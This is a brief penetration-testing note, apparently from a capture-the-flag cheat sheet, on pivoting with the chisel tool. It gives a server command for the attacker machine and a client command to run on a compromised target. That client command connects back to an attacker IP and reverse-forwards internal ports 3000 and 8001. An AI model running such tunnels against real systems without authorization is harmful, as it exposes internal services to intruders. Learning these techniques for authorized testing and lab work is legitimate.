If a target server is running a service on port 8001, you can forward that port to your local (attacker) machine using a tool `chisel`

Chisel is ran on the attacker machine in `server` mode and on the target machine as `client` mode. The following commands will forward port 8001 and port 3000 to the attacker machine over port 7777. You can then access the service on `locahost:8001` on the attacker machine:

# Server (Attacker) Setup
`./chisel server --port 7777 --reverse`
Port 7777 here is the 'listener port' like in a standard reverse shell.

# Client (Target) Setup
`./chisel client 10.10.14.22:7777 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001`
